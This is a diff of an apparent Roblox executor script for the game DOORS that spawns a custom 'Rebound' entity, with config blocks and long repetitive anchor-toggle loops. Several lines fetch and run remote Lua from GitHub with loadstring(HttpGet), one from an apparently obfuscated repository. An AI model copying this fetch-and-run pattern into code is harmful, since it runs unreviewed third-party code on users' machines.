@@ -1,94 +1,71 @@
-local Spawner = loadstring(game:HttpGet('https://raw.githubusercontent.com/MuhXd/DoorSuff/main/OtherSuff/DoorEntitySpawn%2BSource'))()
-game.Lighting.MainColorCorrection.TintColor = Color3.fromRGB(65, 138, 255)
+local spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/Yuzixser-Script/Function/main/Vynixus_SpawnV2.lua"))()
+
+---====== Create entity ======---
+
+local entity = spawner.Create({
+	Entity = {
+		Name = "Rebound",
+		Asset = "rbxassetid://12847684107",
+		HeightOffset = 0
+	},
+	Lights = {
+		Flicker = {
+			Enabled = false,
+			Duration = 5
+		},
+		Shatter = false,
+		Repair = false
+	},
+	Earthquake = {
+		Enabled = false
+	},
+	CameraShake = {
+		Enabled = true,
+		Range = 100,
+		Values = {1.5, 20, 0.1, 1} -- Magnitude, Roughness, FadeIn, FadeOut
+	},
+	Movement = {
+		Speed = 950,
+		Delay = math.random(3, 3.5),
+		Reversed = true
+	},
+	Rebounding = {
+		Enabled = false,
+		Type = "Ambush",
+		Min = 1,
+		Max = 1,
+		Delay = 2.5
+	},
+	Damage = {
+		Enabled = true,
+		Range = 50,
+		Amount = 130
+	},
+	Crucifixion = {
+		Enabled = true,
+		Range = 40,
+		Resist = false,
+		Break = true
+	},
+	Death = {
+		Type = "Curious",
+		Hints = {"You die to Rebound", "...", "...", "..."},
+		Cause = ""
+	}
+})
+
+---====== Debug entity ======---
+
+entity:SetCallback("OnSpawned", function()
+    print("Entity has spawned")
+    game.Lighting.MainColorCorrection.TintColor = Color3.fromRGB(65, 138, 255)
 game.Lighting.MainColorCorrection.Contrast = 1
 local tween = game:GetService("TweenService")
 tween:Create(game.Lighting.MainColorCorrection, TweenInfo.new(0.8), {Contrast = 0}):Play()
 local TweenService = game:GetService("TweenService")
 local TW = TweenService:Create(game.Lighting.MainColorCorrection, TweenInfo.new(0.8),{TintColor = Color3.fromRGB(255, 255, 255)})
 TW:Play()
-
--- Create entity
-local entity = Spawner.createEntity({
-    CustomName = "Rebound", -- Custom name of your entity
-    Model = "rbxassetid://12847684107", -- Can be GitHub file or rbxassetid
-    Speed = 920, -- Percentage, 100 = default Rush speed
-    DelayTime = 3, -- Time before starting cycles (seconds)
-    HeightOffset = 0,
-    CanKill = true,
-    NoDieOnCrouching = false,
-    NoHiding = false,
-    AntiCrucifix = true,
-    KillRange = 50,
-    OneRoom = false,
-    DieOnLook = false,
-    BreakLights = false,
-    BackwardsMovement = true,
-     MovementDeath = {
-        false, -- Turned On?
-        '1',  --- '1'= 'Instant Without Being Looked out' | '2' = 'With Being Looked At'
-    },
-    FlickerLights = {
-        false, -- Enabled/Disabled
-        5, -- Time (seconds)
-    },
-    Cycles = {
-        Min = 1,
-        Max = 1.5,
-        WaitTime = 0,
-    },
-    CamShake = {
-        true, -- Enabled/Disabled
-        {5, 15, 0.1, 1}, -- Shake values (don't change if you don't know)
-        100, -- Shake start distance (from Entity to you)
-    },
-    Jumpscare = {
-        false, -- Enabled/Disabled
-        {
-            Type = "1", -- "Normal" or 21 | "Pop" or 29 | "endlessdoorsrebound" or "Rebound" or 3 | More coming Soon
-            Image1 = "rbxassetid://0", -- Image1 url
-            Image2 = "rbxassetid://0", -- Image2 url
-            Shake = true,
-            Sound1 = {
-                "0", -- SoundId Link or Roblox ID
-                { Volume = 0 }, -- Sound properties
-            },
-            Sound2 = {
-                "0", -- SoundId Link or Roblox ID
-                { Volume = 0.5 }, -- Sound properties
-            },
-            Flashing = {
-                true, -- Enabled/Disabled
-                Color3.fromRGB(220, 181, 166), -- Color
-            },
-            Tease = {
-                true, -- Enabled/Disabled
-                Min = 1,
-                Max = 3,
-            },
-        },
-    },
-    Color = 'GuidingLight', -- CuriousLight ( Yellow ) | GuidingLight ( Blue )
-    DiffrentMessages = true,
-    CustomDialog = {  
-        {"You died to who you call Ripper...", "You can tell his presence by the lights and his scream.", "Hide when he does it!."}, -- Death Messages
-        {"Stop Dieing"},
-        {"Bruh", "Use what you have learned from Rush!"},
-        {"It seems like Template is causing quite the ruckus...", "Hide in a closet or bed as quickly as possible!"},
-         {"I have told You What to do", "YOU JUST HAVE A SKILL ISSUE"}
-    }
-})
-
------[[ Advanced Sctipting ]]-----
-
-entity.Debug.OnEntityMoving = function(Invincible,Hiding,plrCollisionPoint)
-print("Invincible: "..tostring(Invincible))
-print("Player to Entity Collision (None hiding Point): "..tostring(plrCollisionPoint))
-print("Hiding: "..tostring(Hiding))
-end
-       
-entity.Debug.OnEntitySpawned = function()
-    print("Entity has spawned:")
-    function GetGitSound(GithubSnd,SoundName)
+function GetGitSound(GithubSnd,SoundName)
  local url=GithubSnd
  if not isfile(SoundName..".mp3") then
   writefile(SoundName..".mp3", game:HttpGet(url))
@@ -98,822 +75,124 @@ entity.Debug.OnEntitySpawned = function()
  return sound
 end
 
-local scare = Instance.new("Sound")
-scare.Parent = game.Workspace
-scare.Name = "MyEarsBurn"
-scare.SoundId = "rbxassetid://5567523008"
-scare.PlaybackSpeed = 3
-scare.Volume = 1
+local sare = Instance.new("Sound")
+sare.Parent = game.Workspace
+sare.Name = "MyEarsBurn"
+sare.SoundId = "rbxassetid://5567523008"
+sare.PlaybackSpeed = 3
+sare.Volume = 3
 local roomValue = game.ReplicatedStorage.GameData.LatestRoom.Value
 if not ((roomValue >= 50 and roomValue <= 55) or (roomValue >= 96 and roomValue <= 109)) then
 wait()
 if not workspace:FindFirstChild("SeekMovingNewClone") or workspace:FindFirstChild("FigureSetup") then
 game.ReplicatedStorage.GameData.LatestRoom.Changed:Wait()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/huyhoanphuc/testhshs/refs/heads/main/Reboundvs"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/huyhoanggphuc/Entity-obfuscate/refs/heads/main/Rebound%20Endless%20doors.lua"))()
 end
 end
-end
+end)
 
-entity.Debug.OnEntityDespawned = function()
-    print("Entity has despawned:")
-end
+entity:SetCallback("OnStartMoving", function()
+    print("Entity has started moving")
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+    wait()
+    game.workspace.Rebound.RushNew.Anchored = false
+    wait(2)
+    game.workspace.Rebound.RushNew.Anchored = true
+end)
 
-entity.Debug.OnEntityStartMoving = function()
-    print("Entity has started moving:")
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait()
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait()
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait()
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait()
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait()
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait()
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait()
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait()
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait()
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait()
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait()
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait()
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait()
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait()
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
